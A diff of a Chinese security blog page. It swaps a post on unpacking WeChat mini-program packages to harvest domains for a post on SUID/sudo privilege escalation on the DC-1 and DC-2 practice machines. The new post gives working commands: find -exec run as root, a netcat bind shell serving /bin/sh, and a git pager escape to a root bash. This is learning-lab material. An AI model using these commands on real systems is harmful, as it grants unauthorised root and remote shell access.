@@ -79,21 +79,16 @@
 
 
 
-<meta name="description" content="之前接触了一个通过微信小程序获得域名的案例，查资料尝试复现一下。 首先需要准备android环境，没有真机，选择使用模拟器来实现。 安装mumu模拟器(网易出的，感觉相对靠谱吧，关键是免费) 安装好后，打开模拟器，进入商店下载微信。 需要从网上下载工具，root explorer，必须是下图中这个，起初我下载错了app，所以无论怎样都无法找到wxapkg文件。   此外需要对模拟器进行设置，打开r">
+<meta name="description" content="上课讲过，当时一知半解。在打靶机的过程中体会到suid提权的重要性，所以重新研究整理出这篇博客。 1234567891011find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null  &#x2F;表示从文件系统的顶部（根）开始并找到每个目录-perm 表示搜索随后的权限-u &#x3D; s表示查找root用户拥有的文件-type表示我们正在寻找的文件类型f 表示常规文件，而不是目录或特殊文件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20200426反编译微信小程序">
-<meta property="og:url" content="https://marslx.github.io/2020/04/26/20200426%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/index.html">
+<meta property="og:title" content="20200428suid提权">
+<meta property="og:url" content="https://marslx.github.io/2020/04/28/20200428%20suid%E6%8F%90%E6%9D%83[%E5%BE%85%E8%A1%A5%E5%85%85]/index.html">
 <meta property="og:site_name" content="MarsLX BLOG">
-<meta property="og:description" content="之前接触了一个通过微信小程序获得域名的案例，查资料尝试复现一下。 首先需要准备android环境，没有真机，选择使用模拟器来实现。 安装mumu模拟器(网易出的，感觉相对靠谱吧，关键是免费) 安装好后，打开模拟器，进入商店下载微信。 需要从网上下载工具，root explorer，必须是下图中这个，起初我下载错了app，所以无论怎样都无法找到wxapkg文件。   此外需要对模拟器进行设置，打开r">
-<meta property="og:image" content="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-001.png">
-<meta property="og:image" content="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-002.png">
-<meta property="og:image" content="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-003.png">
-<meta property="og:image" content="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-004.png">
-<meta property="article:published_time" content="2020-04-26T03:19:43.000Z">
-<meta property="article:modified_time" content="2020-04-26T08:08:42.572Z">
+<meta property="og:description" content="上课讲过，当时一知半解。在打靶机的过程中体会到suid提权的重要性，所以重新研究整理出这篇博客。 1234567891011find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null  &#x2F;表示从文件系统的顶部（根）开始并找到每个目录-perm 表示搜索随后的权限-u &#x3D; s表示查找root用户拥有的文件-type表示我们正在寻找的文件类型f 表示常规文件，而不是目录或特殊文件">
+<meta property="article:published_time" content="2020-04-28T09:07:20.000Z">
+<meta property="article:modified_time" content="2020-04-30T08:19:24.072Z">
 <meta property="article:author" content="Mars LX">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-001.png">
 
 
 
@@ -123,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="https://marslx.github.io/2020/04/26/20200426反编译微信小程序/"/>
+  <link rel="canonical" href="https://marslx.github.io/2020/04/28/20200428 suid提权[待补充]/"/>
 
 
 
 
 
-  <title>20200426反编译微信小程序 | MarsLX BLOG</title>
+  <title>20200428suid提权 | MarsLX BLOG</title>
   
 
 
@@ -236,7 +231,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://marslx.github.io/2020/04/26/20200426%E5%8F%8D%E7%BC%96%E8%AF%91%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/">
+    <link itemprop="mainEntityOfPage" href="https://marslx.github.io/2020/04/28/20200428%20suid%E6%8F%90%E6%9D%83%5B%E5%BE%85%E8%A1%A5%E5%85%85%5D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Mars LX">
@@ -253,7 +248,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">20200426反编译微信小程序</h1>
+          <h1 class="post-title" itemprop="name headline">20200428suid提权</h1>
         
 
         <div class="post-meta">
@@ -265,8 +260,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-26T11:19:43+08:00">
-                2020-04-26
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T17:07:20+08:00">
+                2020-04-28
               </time>
             
 
@@ -303,51 +298,28 @@
       
 
       
-        <p>之前接触了一个通过微信小程序获得域名的案例，查资料尝试复现一下。</p>
-<p>首先需要准备android环境，没有真机，选择使用模拟器来实现。</p>
-<p>安装mumu模拟器(网易出的，感觉相对靠谱吧，关键是免费)</p>
-<p>安装好后，打开模拟器，进入商店下载微信。</p>
-<p>需要从网上下载工具，root explorer，必须是下图中这个，起初我下载错了app，所以无论怎样都无法找到wxapkg文件。</p>
-<img src="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-001.png" style="zoom:33%;" />
+        <p>上课讲过，当时一知半解。在打靶机的过程中体会到suid提权的重要性，所以重新研究整理出这篇博客。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">/表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line"><span class="literal">-perm</span> 表示搜索随后的权限</span><br><span class="line"><span class="literal">-u</span> = s表示查找root用户拥有的文件</span><br><span class="line"><span class="literal">-type</span>表示我们正在寻找的文件类型</span><br><span class="line">f 表示常规文件，而不是目录或特殊文件</span><br><span class="line"><span class="number">2</span>表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line">&gt;表示重定向</span><br><span class="line">/ dev / null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span><br></pre></td></tr></table></figure>
 
-<p>此外需要对模拟器进行设置，打开root权限。</p>
-<img src="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-002.png" style="zoom:33%;" />
 
-<p>首先登陆微信，先访问下你要反编译的小程序，然后打开root explorer</p>
-<p>在如下目录中找到*.wxapkg文件，这就是你想要破解的小程序了。</p>
-<blockquote>
-<p>/data/data/com.tencent.mm/MicroMsg/{一长串16进制的字符串}/appbrand/pkg</p>
-</blockquote>
-<p>小程序拷贝出来，mumu模拟器提供了文件共享功能，共享文件夹在/mnt/sdcard目录下。</p>
-<img src="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-003.png" style="zoom:33%;" />
 
-<p>使用github上下载的反编译工具。</p>
-<blockquote>
-<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fleo9960%2Fwechat-app-unpack" target="_blank" rel="noopener">https://github.com/leo9960/wechat-app-unpack</a><br>直接看这个老哥的代码吧支持</p>
-<p>Python2版本：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgist.github.com%2Ffeix%2F32ab8f0dfe99aa8efa84f81ed68a0f3e" target="_blank" rel="noopener">https://gist.github.com/feix/32ab8f0dfe99aa8efa84f81ed68a0f3e</a></p>
-<p>Python3版本：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgist.github.com%2FInteg%2Fbcac5c21de5ea35b63b3db2c725f07ad" target="_blank" rel="noopener">https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad</a></p>
-<p>PHP版本：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FClarence-pan%2Funpack-wxapkg" target="_blank" rel="noopener">https://github.com/Clarence-pan/unpack-wxapkg</a></p>
-<p>JAVA版本：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fmoqi2011%2Funweapp" target="_blank" rel="noopener">https://github.com/moqi2011/unweapp</a></p>
-<p>nodejs版本：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fthedreamwork%2Funwxapkg" target="_blank" rel="noopener">https://github.com/thedreamwork/unwxapkg</a></p>
-<p>Kaitai Struct版本：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fcoolzilj%2Fkaitai_struct_format_for_wxapkg" target="_blank" rel="noopener">https://github.com/coolzilj/kaitai_struct_format_for_wxapkg</a></p>
-<p>作者：夬大爷<br>链接：<a href="https://www.jianshu.com/p/2ab8b34da590" target="_blank" rel="noopener">https://www.jianshu.com/p/2ab8b34da590</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-</blockquote>
-<p>我是用的 <a href="https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad" target="_blank" rel="noopener">https://gist.github.com/Integ/bcac5c21de5ea35b63b3db2c725f07ad</a> 这个 python3版本</p>
-<p>下载到桌面某文件夹</p>
-<p>命令格式为</p>
-<blockquote>
-<p>python38  unwxapkg.py  1.wxapkg ./1/</p>
-</blockquote>
-<p>其中参数1为小程序文件名,参数2为输出目录</p>
-<blockquote>
-<p>usage: unwxapkg.py filename [output_dir]</p>
-</blockquote>
-<img src="https://marslxblog.oss-cn-zhangjiakou.aliyuncs.com/uPic/wxxcxFBY-004.png" style="zoom:33%;" />
 
-<blockquote>
-<p>这里是小程序访问的域名，原域名删掉了，假装有FLAG{}，随便写的</p>
-</blockquote>
-<p>得到域名之后可以进行二级域名与ip爆破。</p>
+
+<h3 id="0x00-提权的开始"><a href="#0x00-提权的开始" class="headerlink" title="0x00 提权的开始"></a>0x00 提权的开始</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-命令"><a href="#0x01-命令" class="headerlink" title="0x01 命令"></a>0x01 命令</h3><h4 id="find-DC-1"><a href="#find-DC-1" class="headerlink" title="find [DC-1]"></a>find [DC-1]</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">创建temp文件，因为find必须找到该文件才可以</span><br><span class="line">touch temp</span><br><span class="line"></span><br><span class="line">执行提权可以得到root权限</span><br><span class="line">find temp <span class="literal">-exec</span> whoami \;</span><br><span class="line"></span><br><span class="line">将自己具有root权限的的sh向外反弹</span><br><span class="line">find temp <span class="literal">-exec</span> nc <span class="literal">-l</span> <span class="number">5555</span> <span class="literal">-e</span> /bin/sh \; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在另一台机器上执行如下语句，即可获得root权限的sh</span><br><span class="line">nc <span class="number">172.20</span>.<span class="number">10.3</span> <span class="number">5555</span> </span><br><span class="line"></span><br><span class="line">注意接受反弹出来的sh时，是没有交互界面的，并且不能使用python <span class="literal">-c</span> <span class="string">'import pty;pty.spawn("/bin/bash")'</span>来得到交互界面，因为交互后的权限非root了</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="git-DC-2"><a href="#git-DC-2" class="headerlink" title="git [DC-2]"></a>git [DC-2]</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用su切换至jerry用户后，使用sudo <span class="literal">-l</span>可以查看当前可用的命令，发现git命令在列，尝试使用git提权</span><br><span class="line">sudo git <span class="literal">-p</span> -<span class="literal">-help</span></span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>搜索资料中的more/less/vim等等在本靶机中都无法测试使用….</p>
+<p>其他命令遇到后待补充…</p>
+<p>参考链接</p>
+<p><a href="https://www.cnblogs.com/Qiuzhiyu/p/12528319.html" target="_blank" rel="noopener">https://www.cnblogs.com/Qiuzhiyu/p/12528319.html</a></p>
+<p><a href="https://blog.csdn.net/fly_hps/article/details/80428173" target="_blank" rel="noopener">https://blog.csdn.net/fly_hps/article/details/80428173</a></p>
 
       
     </div>
@@ -372,8 +344,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/04/24/20200424%20DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" rel="next" title="20200424DC-1靶机渗透记录">
-                <i class="fa fa-chevron-left"></i> 20200424DC-1靶机渗透记录
+              <a href="/2020/04/26/%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" rel="next" title="命令记录持续更新">
+                <i class="fa fa-chevron-left"></i> 命令记录持续更新
               </a>
             
           </div>
@@ -382,8 +354,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/04/26/%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" rel="prev" title="命令记录持续更新">
-                命令记录持续更新 <i class="fa fa-chevron-right"></i>
+              <a href="/2020/04/30/20200430%20DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" rel="prev" title="20200430DC-2靶机渗透记录">
+                20200430DC-2靶机渗透记录 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -436,8 +408,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -479,6 +460,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-提权的开始"><span class="nav-number">1.</span> <span class="nav-text">0x00 提权的开始</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-命令"><span class="nav-number">2.</span> <span class="nav-text">0x01 命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#find-DC-1"><span class="nav-number">2.1.</span> <span class="nav-text">find [DC-1]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#git-DC-2"><span class="nav-number">2.2.</span> <span class="nav-text">git [DC-2]</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
